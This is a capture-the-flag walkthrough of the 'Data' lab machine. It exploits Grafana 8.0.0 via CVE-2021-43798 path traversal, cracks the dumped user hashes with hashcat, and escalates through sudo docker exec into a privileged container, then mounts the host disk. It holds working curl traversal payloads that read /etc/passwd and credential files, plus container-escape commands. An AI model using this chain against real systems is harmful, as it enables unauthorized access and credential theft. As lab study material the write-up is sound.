# Data - Easy

```sh
sudo vim /etc/hosts
# add data.htb

nmap -T4 -p- -A -Pn -v data.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
    * 3000/tcp - ppp

* the webpage on port 3000 redirects to 'http://data.htb:3000/login', and is a login page for Grafana; the footer mentions v8.0.0 (41f0542c1e)

* Googling shows that Grafana is an open-source analytics & visualization platform; trying default creds like 'admin:admin' and 'admin:password' fails

* Googling for exploits associated with Grafana 8.0.0 leads to [CVE-2021-43798 - a arbitrary file read vuln](https://pentest-tools.com/vulnerabilities-exploits/grafana-v8x-arbitrary-file-read_2187), and it does not need authentication

* checking the [exploit details from this blog](https://labs.detectify.com/security-guidance/how-i-found-the-grafana-zero-day-path-traversal-exploit-that-gave-me-access-to-your-logs/), and the [plugin wordlist to use for LFI](https://github.com/jas502n/Grafana-CVE-2021-43798), we can check if the path traversal vuln exists or not:

    ```sh
    curl --path-as-is http://data.htb:3000/public/plugins/alertlist/../../../../../../../../etc/passwd
    # '--path-as-is' is required to interpret the URL correctly
    # this works
    ```

* the exploit works with a lot of plugin names, and we get the contents of ```/etc/passwd``` using this payload

* the ```/etc/passwd``` does not show any user on the box except for 'root' - this could also mean it is a Docker container

* we can continue the enumeration by reading other files on the system, using the same payload format:

    * ```/etc/hosts``` - this file includes an entry for 172.17.0.2 with a randomized name, indicating that it is a Docker container

    * ```/etc/issue``` - Alpine Linux 3.13

    * ```/proc/self/environ``` - no data

* we can also search for [files related to Grafana](https://hackviser.com/tactics/pentesting/services/grafana#path-traversal-cve-2021-43798):

    * ```/etc/grafana/grafana.ini``` - this shows ```sqlite3``` DB is used on port 3306 locally; also discloses creds 'admin:admin' and secret key 'SW2YcwTIb9zpOOhoPsMm'

    * ```/var/lib/grafana/grafana.db``` - this shows binary output, so we need to save this to a file using this command - ```curl --path-as-is http://data.htb:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db --output grafana.db```

* we can check if the DB contains any sensitive data:

    ```sh
    sqlite3 grafana.db

    .tables
    # tables list includes 'user'

    select * from user;
    # dumps data from 'user' table

    .schema user
    ```

* the 'user' table dump includes hashes for users 'admin' ('admin@localhost') and 'boris' ('boris@data.vl')

* checking the schema columns for this table shows that we have 3 data entries to consider - password, salt & rands

* Googling for hash format for Grafana leads to [this Grafana2Hashcat tool](https://github.com/iamaldi/grafana2hashcat) - this can be used to convert the Grafana hash & salt to PBKDF2_HMAC_SHA256 format, so that we can crack it with ```hashcat```

* we can use this tool to convert the hashes and then crack them:

    ```sh
    vim grafanahashes.txt
    # paste the hashes for both users in this file
    # in 'hash,salt' format

    python3 grafana2hashcat.py grafanahashes.txt -o tocrack.txt
    # this saves the converted hashes in the output file
    
    # we can crack it using the given format now
    hashcat -m 10900 tocrack.txt /usr/share/wordlists/rockyou.txt
    ```

* ```hashcat``` is able to crack the hash for 'boris' to give the cleartext 'beautiful1'

* we can try using these creds for SSH login:

    ```sh
    ssh boris@data.htb
    # this works

    ls -la

    cat user.txt
    # user flag

    sudo -l
    ```

* ```sudo -l``` shows the following - ```(root) NOPASSWD: /snap/bin/docker exec *```

* we can refer [the docker breakout privesc guide](https://blog.1nf1n1ty.team/hacktricks/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation) for docker enumeration and privesc:

    ```sh
    find / -name docker.sock 2>/dev/null
    # finds the docker socket location
    # '/run/docker.sock'

    docker -H unix:///run/docker.sock images
    # permission denied
    ```

* we do not have privilege to run standard ```docker``` commands, but we can run ```docker exec``` - we can use this to get an interactive shell in a container, and then try to escape the container

* from the Grafana instance earlier, we were able to find a Docker container earlier - ```/etc/hostname``` for Docker container is also the container ID by default

* we can use the hostname (container ID) with the ```docker exec``` command & the ```privileged``` flag (since we can run the command as ```sudo```) to get an interactive shell as root user in the container:

    ```sh
    sudo /snap/bin/docker exec --privileged -u 0 -it e6ff5b1cbc85 /bin/sh
    # '--privileged' and '-u 0' to run the commands as root user
    # '-it' for interactive
    # 'e6ff5b1cbc85' is the container ID/hostname
    # launches '/bin/sh' in container

    # the order of arguments is important here

    id
    # we are root
    ```

* we have a shell as root in the container - we can now check for [privilege escalation techniques from inside the container](https://juggernaut-sec.com/docker-breakout-lpe/):

    ```sh
    cat /proc/1/status | grep -i "seccomp"
    # this is a privileged container

    df -h
    # find which drive belongs to the host
    # '/dev/sda1' in this case - mounted on '/etc/hosts'

    # mount the host drive now
    mkdir -p /mnt/test

    mount /dev/sda1 /mnt/test

    ls -la /mnt/test
    # we have access to host filesystem now

    ls -la /mnt/test/root

    cat /mnt/test/root/root.txt
    # root flag
    ```
